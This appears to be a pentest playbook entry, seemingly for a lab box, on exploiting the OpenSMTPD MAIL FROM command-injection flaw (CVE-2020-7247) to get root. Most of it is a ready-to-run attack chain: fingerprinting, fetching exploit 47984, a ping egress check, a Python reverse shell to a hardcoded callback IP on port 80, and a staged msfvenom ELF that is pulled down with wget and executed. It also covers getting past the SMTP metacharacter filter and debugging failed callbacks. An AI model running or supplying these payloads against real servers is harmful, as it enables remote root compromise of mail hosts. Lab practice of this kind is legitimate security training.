title: OpenSMTPD RCE (CVE-2020-7247) → root
body: If SMTP on 25 banners as OpenSMTPD (smtp-commands NSE shows 'This is OpenSMTPD'), check the version - anything < 6.6.2 (and the 'uncommented' default config) is vulnerable to CVE-2020-7247. The bug: smtp_mailaddr in smtp_session.c doesn't escape shell metacharacters in the MAIL FROM field, so a crafted address runs arbitrary commands AS ROOT. This is not a foothold-then-privesc box - RCE here IS root, because OpenSMTPD delivers mail as root (you'll see 'Delivered-To: root@host'). Exploit: searchsploit 47984 (CVE-2020-7247). The injection point is MAIL FROM:<;COMMAND;> - and that delivery channel is FILTERED: it rejects shell metacharacters > & | with '503 Unsupported option'. So a raw 'bash -i >& /dev/tcp/..' payload fails at the SMTP layer before it ever runs. Two ways around the filter (below). Confirm egress with a ping first - and note this box family commonly allows outbound on port 80 ONLY, so callbacks to 443/4455/etc silently fail even though execution works.
cmd:
# ── 1) FINGERPRINT ──
nmap -p 25 --script smtp-commands $ip      # 'This is OpenSMTPD' + version
# vulnerable: OpenSMTPD < 6.6.2, uncommented default config -> CVE-2020-7247

# ── 2) GET THE EXPLOIT ──
searchsploit -m linux/remote/47984.py      # or 47984.py from exploit-db

# ── 3) PROVE EXECUTION + EGRESS (ping yourself) ──
sudo tcpdump -i tun0 icmp                  # terminal 1
python3 47984.py $ip 25 'ping -c 4 192.168.45.211'   # terminal 2
# ICMP replies = command runs (as root) AND box can reach you. If yes, only the
# callback step remains. This box family often allows OUTBOUND on port 80 ONLY.

# ══════════════════════════════════════════════════
# THE FILTER PROBLEM: MAIL FROM rejects  >  &  |
#   'bash -i >& /dev/tcp/IP/PORT 0>&1' -> 503 Unsupported option &
# Use a payload with NO shell metacharacters. Two reliable methods:
# ══════════════════════════════════════════════════

# ── METHOD A: python reverse shell (no >, &, | -- redirection is via os.dup2) ──
# Callback to 80 (the port this box family allows). Single backslashes \" NOT double \\\".
nc -lvnp 80
python3 47984.py $ip 25 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.211\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"'
# -> root shell on 80. (os.dup2 does the fd redirection INSIDE python, so the
#    payload contains no >, &, | for the SMTP filter to choke on.)

# ── METHOD B: staged msfvenom ELF (official-walkthrough method) ──
# The payload commands (wget / chmod / run) have no metacharacters either.
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.45.211 LPORT=80
python3 -m http.server 8000                                  # serve the ELF (any port the box can reach)
python3 47984.py $ip 25 'wget 192.168.45.211:8000/shell -O /tmp/shell'
python3 47984.py $ip 25 'chmod +x /tmp/shell'
nc -lvnp 80                                                  # listener on the allowed port
python3 47984.py $ip 25 '/tmp/shell'
# -> root shell on 80.

# ── METHOD C: base64 the metacharacters away (if you must use bash /dev/tcp) ──
# Even base64 -d | bash reintroduces a pipe; prefer A or B. If you go this route,
# write the b64 to a file via separate fires, then 'bash /tmp/x' (no pipe inline).

# ── COMMON FAILURES (this exact box) ──
# 503 Unsupported option &   -> metacharacter hit the SMTP filter; use Method A/B (no >,&,|)
# payload runs, no shell      -> wrong port. Callback must be 80 on this box family.
# \\\" double-backslash       -> over-escaped; use SINGLE backslash \" inside the python -c
# bare 'nc IP 80' connects but dumps mail headers -> nc with no shell attached; use Method A
warn: MAIL FROM rejects shell metacharacters (> & |) with '503 Unsupported option' - a raw bash reverse shell fails at the SMTP layer before running. Use the python payload (redirection via os.dup2, no metacharacters) or a staged msfvenom ELF. Egress on this box family is commonly port 80 ONLY - callbacks to other ports silently fail even though the command executes as root. Watch the escaping: SINGLE backslash \" inside python -c, not double.

choices.label: Got root shell — upgrade the TTY
Shell won't connect — port/encoding debug ladder
